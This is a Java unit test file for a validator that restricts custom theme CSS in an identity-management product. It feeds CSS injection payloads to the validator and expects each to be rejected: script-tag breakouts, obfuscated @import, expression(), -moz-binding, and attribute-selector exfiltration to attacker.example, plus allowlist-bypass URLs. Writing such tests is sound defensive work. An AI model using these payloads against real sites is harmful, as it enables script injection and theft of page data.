/*
 * Copyright 2026 HelixIAM contributors
 * SPDX-License-Identifier: Apache-2.0
 */

package io.helixiam.authorization.theme;

import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.CsvSource;
import org.junit.jupiter.params.provider.ValueSource;
import org.junit.jupiter.api.Test;

import java.util.List;
import java.util.Set;

import static org.assertj.core.api.Assertions.assertThat;

/** Spec §4: the custom-CSS escape hatch accepts plain CSS only and names the offending construct. */
class CustomCssValidatorTest {

    private static final Set<String> ORIGINS = Set.of("https://img.monthfold.example");

    private static java.util.Optional<String> check(final String css) {
        return CustomCssValidator.validate(css, "firm", ORIGINS);
    }

    @Test
    void plainCss_isAccepted() {
        assertThat(check(".helix-form h1 { letter-spacing: -0.01em; color: #16211f; }\n"
                + "@media (max-width: 600px) { .x { padding: 0 } }\n"
                + ".a::before { content: \"\\201C\"; }")).isEmpty();
        assertThat(check(null)).isEmpty();
        assertThat(check("")).isEmpty();
    }

    @ParameterizedTest(name = "{0} -> names {1}")
    @CsvSource(delimiter = '|', quoteCharacter = '`', value = {
            "</style><script>alert(1)</script>|<",
            ".a { color: red } <!--|<",
            ".a { content: '\\3c/style>' }|<",
            "@import url(https://img.monthfold.example/x.css);|@import",
            "@IMPORT 'x.css';|@import",
            "@im/**/port 'x.css';|@import",
            "@\\69mport 'x.css';|@import",
            "@charset \"utf-8\";|@charset",
            "@namespace svg url(http://www.w3.org/2000/svg);|@namespace",
            ".a { width: expression(alert(1)) }|expression(",
            ".a { width: EXPRESSION (alert(1)) }|expression(",
            ".a { behavior: url(x.htc) }|behavior:",
            ".a { -moz-binding: url(x.xml#xss) }|-moz-binding",
            ".a { background: url(javascript:alert(1)) }|javascript:",
            ".a { background: url(\"https://attacker.example/leak?c=a\") }|url(",
            "input[value^=a] { background-image: url(https://attacker.example/a) }|url(",
            ".a { background: url(//attacker.example/a.png) }|url(",
            ".a { background: url(data:image/png;base64,AAAA) }|url(",
            ".a { background: url(/realms/other/theme/assets/logo.png) }|url(",
            ".a { background: u\\72l(https://attacker.example/a) }|url(",
            ".a { background: image-set('https://attacker.example/a.png' 1x) }|image-set(",
            ".a { background: src(https://attacker.example/a.png) }|src("
    })
    void forbiddenConstructs_areRejected_namingTheConstruct(final String css, final String construct) {
        assertThat(check(css)).as(css).hasValueSatisfying(m -> assertThat(m).contains(construct));
    }

    @ParameterizedTest
    @ValueSource(strings = {
            ".a { background: url(/realms/firm/theme/assets/a1b2c3.png) }",
            ".a { background: url('/realms/firm/theme/assets/a1b2c3.svg') }",
            ".a { background: url( \"https://img.monthfold.example/hero.webp\" ) }"})
    void ownAssetsAndAllowlistedOrigins_areAccepted(final String css) {
        assertThat(check(css)).as(css).isEmpty();
    }

    @Test
    void anAllowlistedOriginMustMatchExactly_notAsAPrefix() {
        assertThat(check(".a { background: url(https://img.monthfold.example.attacker.example/x.png) }")).isPresent();
        assertThat(check(".a { background: url(https://img.monthfold.example@attacker.example/x.png) }")).isPresent();
    }

    @Test
    void over32KiB_isRejected() {
        final String css = ".a{}".repeat(CustomCssValidator.MAX_BYTES / 4 + 1);
        assertThat(check(css)).hasValueSatisfying(m -> assertThat(m).contains("32 KB"));
        assertThat(check(".a{}".repeat(CustomCssValidator.MAX_BYTES / 4))).isEmpty();
    }

    @Test
    void everyViolationIsReported_inOrder() {
        assertThat(CustomCssValidator.problems("@import 'a'; .b { behavior: x }", "firm", List.of()))
                .hasSize(2);
    }
}
